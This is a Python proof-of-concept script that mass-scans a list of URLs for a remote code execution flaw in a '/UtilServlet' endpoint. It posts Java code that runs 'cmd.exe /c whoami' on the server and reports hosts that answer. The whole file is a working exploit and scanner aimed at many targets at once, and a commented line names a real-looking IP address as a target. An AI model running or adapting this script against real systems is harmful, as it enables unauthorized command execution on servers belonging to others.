import requests
from tqdm import tqdm
def poc(url):
    # 目标URL
    # url = "http://14.153.218.208:8001/UtilServlet"
    # 请求头
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    # 请求体数据
    data = {
        "operation": "calculate",
        "value": "BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"cmd.exe /c whoami\").getInputStream()));String line;StringBuilder b = new StringBuilder();while ((line = br.readLine()) != null) {b.append(line);}return new String(b);",
        "fieldName": "example_field"
    }
    # 发送POST请求
    try:
        response = requests.post(url+'/UtilServlet', headers=headers, data=data,verify=False,timeout=5)
        # 打印响应内容
        if response.status_code==200:
            if len(response.text) <50 :
                print(url)
                print(f"Response Text: {url} : {response.text}")
    except:
        pass

def process_url(url):
    url = url.strip()
    if not url.startswith('http'):
        url = 'http://' + url
    poc(url)


with open("urls.txt", "r") as file:
        urls = list(set(file.readlines()))
import concurrent.futures
with concurrent.futures.ThreadPoolExecutor() as executor:
    list(tqdm(executor.map(process_url, urls), total=len(urls)))
